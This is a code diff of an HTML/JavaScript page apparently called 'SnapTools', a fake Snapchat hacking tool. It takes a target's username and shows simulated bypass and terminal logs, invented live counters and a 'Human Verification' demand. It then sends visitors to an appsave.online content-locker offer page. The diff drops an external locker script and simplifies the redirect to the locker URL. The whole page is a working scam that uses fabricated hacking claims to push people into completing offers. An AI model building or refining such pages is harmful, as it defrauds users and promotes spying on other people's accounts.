@@ -7,9 +7,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@600;700;800&family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <!-- API / Content Locker Script Integration -->
-    <script type="text/javascript" src="https://appsave.online/script_url.js?id=YOUR_LOCKER_ID"></script>
-
     <style>
         :root {
             --snap-yellow: #FFFC00;
@@ -30,7 +27,6 @@
             --glow-color: rgba(255, 252, 0, 0.15);
         }
 
-        /* Light Theme Colors */
         [data-theme="light"] {
             --bg-chat: #f4f4f5;
             --bg-workspace: #e4e4e7;
@@ -67,7 +63,6 @@
             transition: background-color 0.3s, color 0.3s;
         }
 
-        /* --- Welcome Instructions Popup Styles --- */
         .instructions-overlay {
             position: fixed;
             inset: 0;
@@ -200,7 +195,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* --- Sleek Live Status Bar --- */
         .live-status-bar {
             background: rgba(12, 12, 14, 0.85);
             border-bottom: 1px solid var(--border-color);
@@ -330,7 +324,6 @@
             gap: 8px;
         }
 
-        /* Language Selector Styling */
         .lang-wrapper {
             position: relative;
             display: inline-block;
@@ -576,7 +569,6 @@
             color: var(--text-main);
         }
 
-        /* Terminal Log Box */
         .terminal-log-box {
             background: #020205;
             border: 1px solid var(--border-color);
@@ -650,7 +642,6 @@
         .progress-bar-bg { width: 100%; background: var(--border-color); height: 6px; border-radius: 10px; overflow: hidden; }
         .progress-bar-fill { height: 100%; background: var(--snap-yellow); width: 0%; box-shadow: 0 0 10px var(--glow-color); transition: width 0.1s linear; }
 
-        /* Offer/Verification Card */
         .offer-verification-card {
             border: 1px solid var(--border-color);
             background: linear-gradient(145deg, #121218, #07070a);
@@ -783,7 +774,6 @@
 
         .hidden-row { display: none !important; }
 
-        /* Custom Alert Notification Dashboard Layout */
         .custom-alert {
             position: fixed;
             top: 24px;
@@ -827,7 +817,6 @@
 </head>
 <body>
 
-    <!-- --- Welcome Instructions Popup Markup --- -->
     <div class="instructions-overlay" id="popupOverlay">
         <div class="instructions-card">
             <div class="instructions-logo">
@@ -900,7 +889,6 @@
             </div>
         </div>
 
-        <!-- --- Sleek Dynamic Live Status Bar --- -->
         <div class="live-status-bar">
             <span class="status-dot"></span>
             <span class="status-text"><span id="lblActiveConn">Active Connections:</span> <strong id="activeUsersVal">12,841</strong></span>
@@ -944,7 +932,6 @@
     </div>
 
     <script>
-        // --- DATA DICTIONARY FOR TRANSLATIONS ---
         const translations = {
             EN: {
                 popTitle: "How to Use SnapTools",
@@ -976,7 +963,6 @@
                 verifyTitle: "Human Verification Required",
                 verifyDesc: "The secure proxy tunnel linked successfully. To protect server resources from automated bots, you must complete the human verification below. Important: You must complete the selected offer exactly as instructed on the next page to instantly reveal your live decrypted dashboard logs and images.",
                 verifyBtn: "Pass Verification",
-                // Features
                 feat1: "Snapchat Snaping",
                 feat2: "Snap Camera",
                 feat3: "View Friends List",
@@ -1140,7 +1126,6 @@
         };
 
         let currentLangCode = "EN";
-
         const chatWindow = document.getElementById('chatWindow');
         const userInputField = document.getElementById('userInputField');
         const sendBtn = document.getElementById('sendBtn');
@@ -1167,12 +1152,10 @@
 
         document.body.setAttribute('data-theme', 'dark');
 
-        // --- FUNCTION TO UPDATE STATIC AND DYNAMIC TEXT ON THE FLY ---
         function updatePageLanguage(lang) {
             currentLangCode = lang;
             const dict = translations[lang];
 
-            // 1. Update Static Popups and Labels
             document.getElementById('popTitle').innerText = dict.popTitle;
             document.getElementById('step1Title').innerText = dict.step1Title;
             document.getElementById('step1Desc').innerText = dict.step1Desc;
@@ -1187,35 +1170,29 @@
             document.getElementById('lblActiveConn').innerText = dict.lblActiveConn;
             document.getElementById('lblBypassedDb').innerText = dict.lblBypassedDb;
             
-            // Menu
             document.getElementById('menuPrivacy').innerHTML = `<i class="fa-solid fa-user-shield"></i> ${dict.menuPrivacy}`;
             document.getElementById('menuRules').innerHTML = `<i class="fa-solid fa-scale-balanced"></i> ${dict.menuRules}`;
             document.getElementById('menuSupport').innerHTML = `<i class="fa-solid fa-circle-question"></i> ${dict.menuSupport}`;
 
-            // 2. Update Welcome message if it exists and hasn't been completely modified
             const welcomeTextNode = document.getElementById('welcomeText');
-            if (welcomeTextNode) {
+            if (welcomeTextNode && welcomeTextNode.children.length === 0) {
                 welcomeTextNode.innerText = dict.welcomeText;
             }
 
-            // 3. Dynamic Update of AI generated text already in the DOM
-            // Linked profile dynamic text update
             const linkedNode = document.querySelector('[id^="ai_linked_"]');
             if (linkedNode) {
                 const headerSpan = linkedNode.querySelector('.linked-header-text');
                 if (headerSpan) {
                     headerSpan.innerText = dict.linkedText.replace("{user}", currentTargetUser);
                 }
-                // Update feature option buttons titles dynamically
                 for (let i = 1; i <= 7; i++) {
                     const btnTitleSpan = linkedNode.querySelector(`.title-feat${i}`);
                     if (btnTitleSpan) btnTitleSpan.innerText = dict['feat' + i];
                 }
             }
 
-            // Loading / Terminal dynamic text update
             const loadingNode = document.querySelector('[id^="ai_load_"]');
-            if (loadingNode) {
+            if (loadingNode && selectedModule) {
                 const fetchIntroSpan = loadingNode.querySelector('.fetch-intro-text');
                 if (fetchIntroSpan) {
                     fetchIntroSpan.innerText = dict.fetchingText.replace("{node}", dict[selectedModule]);
@@ -1226,7 +1203,6 @@
                 if (streamSpan) streamSpan.innerHTML = `<i class="fa-regular fa-eye"></i> ${dict.lblLiveStream}`;
             }
 
-            // Final Offer/Verification card dynamic text update
             const finalNode = document.querySelector('[id^="final_"]');
             if (finalNode) {
                 const cardH4 = finalNode.querySelector('h4');
@@ -1303,21 +1279,13 @@
         function toggleSnapMenu(event) {
             event.stopPropagation();
             langDropdown.style.display = 'none';
-            if (snapMenu.style.display === 'flex') {
-                snapMenu.style.display = 'none';
-            } else {
-                snapMenu.style.display = 'flex';
-            }
+            snapMenu.style.display = (snapMenu.style.display === 'flex') ? 'none' : 'flex';
         }
 
         function toggleLangDropdown(event) {
             event.stopPropagation();
             snapMenu.style.display = 'none';
-            if (langDropdown.style.display === 'flex') {
-                langDropdown.style.display = 'none';
-            } else {
-                langDropdown.style.display = 'flex';
-            }
+            langDropdown.style.display = (langDropdown.style.display === 'flex') ? 'none' : 'flex';
         }
 
         function selectLanguage(lang) {
@@ -1349,13 +1317,16 @@
 
         window.onload = () => {
             initDynamicLiveCounters();
-            updatePageLanguage('EN'); // Default loading
+            updatePageLanguage('EN');
             const welcomeTextNode = document.getElementById('welcomeText');
             typeWriterEffect(welcomeTextNode, translations[currentLangCode].welcomeText, 12);
         };
 
         userInputField.addEventListener('keydown', (e) => { 
-            if (e.key === 'Enter') submitUserIdentifier(); 
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                submitUserIdentifier();
+            }
         });
 
         function showTyping() {
@@ -1415,10 +1386,8 @@
                     
                     const dict = translations[currentLangCode];
                     const responseText = dict.linkedText.replace("{user}", val);
-                    
                     const msgBubbleContainer = document.getElementById(nextId);
                     
-                    // Create text holder for typewriter
                     const textHolder = document.createElement('span');
                     textHolder.className = "linked-header-text";
                     msgBubbleContainer.appendChild(textHolder);
@@ -1489,7 +1458,7 @@
                 showAlertNotification();
                 return;
             }
-            selectedModule = nodeName; // e.g., 'feat1'
+            selectedModule = nodeName;
             selectModuleNode(nodeName, username);
         }
 
@@ -1563,6 +1532,7 @@
 
         function simulateTerminalLogs(consoleId, callback) {
             const consoleBox = document.getElementById(consoleId);
+            if(!consoleBox) return;
             const dict = translations[currentLangCode];
             
             const logs = [
@@ -1637,16 +1607,7 @@
         }
 
         function redirectToOgadsLocker() {
-            // Trigger API locker function if present, otherwise fallback to URL redirect
-            if (typeof call_locker === 'function') {
-                call_locker();
-            } else if (typeof OGBlocks !== 'undefined' && typeof OGBlocks.open === 'function') {
-                OGBlocks.open();
-            } else if (typeof _openLocker === 'function') {
-                _openLocker();
-            } else {
-                window.location.href = "https://appsave.online/cl/i/j7nvnv";
-            }
+            window.location.href = "https://appsave.online/cl/i/j7nvnv";
         }
     </script>
 </body>
